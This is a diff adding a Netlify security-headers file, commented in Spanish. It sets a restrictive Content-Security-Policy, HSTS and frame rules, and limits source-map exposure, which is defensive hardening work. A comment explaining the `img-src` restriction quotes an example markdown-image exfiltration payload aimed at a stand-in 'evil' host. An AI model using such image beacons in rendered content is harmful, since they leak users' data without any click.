@@ -1,0 +1,46 @@
+# Cabeceras de seguridad que Netlify aplica al sitio publicado.
+#
+# ⚠️ Archivo aparte y ⊥ un bloque `[[headers]]` en `netlify.toml`, a proposito: es **aditivo**. Tres
+# repos ya tienen `netlify.toml` con sus redirects y su cacheo; esto ⊥ los pisa y ⊥ hay que fusionar
+# nada a mano al instalarlo.
+#
+# 🔴 El `connect-src` nombra el proyecto Supabase de ESTE repo ∴ ⊥ es copiable tal cual. Un
+# placeholder sin reemplazar es PEOR que ⊥ tener la cabecera, porque parece puesta:
+# `verificar-headers.mjs` falla si lo encuentra.
+#
+# 🔗 Que decir en cada cabecera y como verificarlo despues del deploy: `tools/headers/README.md`.
+
+# `connect-src` incluye https://id.guarnold.com.ar: el modo cuenta central (`lib/sesion-compartida.mjs`)
+# hace `fetch(..., { credentials: "include" })` ahí para obtener el pase de acceso. Sin ese host la CSP
+# lo bloquea y el login central ⊥ anda.
+#
+# 🔴 `img-src` NO lleva `https:` a secas: una imagen se cargaria desde CUALQUIER host, y eso
+# convierte al renderer de markdown en canal de exfiltracion — `![](https://evil/?d=<datos>)` en
+# contenido que la app muestre dispara el GET **solo al renderizar**, sin un clic. `connect-src`
+# ⊥ lo tapa: bloquea `fetch()`, ⊥ una `<img>`. Al acotarlo, las imagenes de host ajeno pegadas a
+# mano dejan de renderizar: medilo antes (en este repo eran 0). 🔗 `verificar-headers.mjs`.
+#
+/*
+  Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com; img-src 'self' data: blob: https://brzuaxeuqqqipkaennre.supabase.co; connect-src 'self' https://id.guarnold.com.ar https://brzuaxeuqqqipkaennre.supabase.co wss://brzuaxeuqqqipkaennre.supabase.co; frame-ancestors 'none'; base-uri 'self'; form-action 'self'; object-src 'none'
+  Referrer-Policy: strict-origin-when-cross-origin
+  X-Frame-Options: DENY
+  X-Content-Type-Options: nosniff
+  Strict-Transport-Security: max-age=31536000; includeSubDomains
+
+# El service worker se re-pide en cada comprobacion de version. El navegador ya lo saca del cache
+# HTTP por defecto (`updateViaCache: 'imports'`), pero decirlo explicito cuesta cero y ata este
+# archivo al ciclo de actualizacion de `tools/pwa/`.
+/sw.js
+  Cache-Control: no-cache
+
+# 🔴 Los source maps se generan con `sourcemap: hidden` ∴ el `.js` ⊥ lleva el comentario
+# `sourceMappingURL` y el navegador ⊥ los pide. Pero el deploy sube `dist/` ENTERO: el archivo
+# esta ahi, en una URL adivinable (mismo nombre + `.map`). Sin esto, `hidden` solo saco el cartel
+# que decia donde estaba el codigo fuente.
+#
+# ⚠️ Netlify ⊥ tiene forma de NO publicar un archivo desde `_headers` ∴ esto es defensa en
+# profundidad, ⊥ la solucion: lo que corresponde es **borrar los `.map` despues de subirlos al
+# error tracker**, en el paso de deploy. 🔗 `tools/headers/README.md`.
+/*.map
+  X-Robots-Tag: noindex
+  Cache-Control: no-store
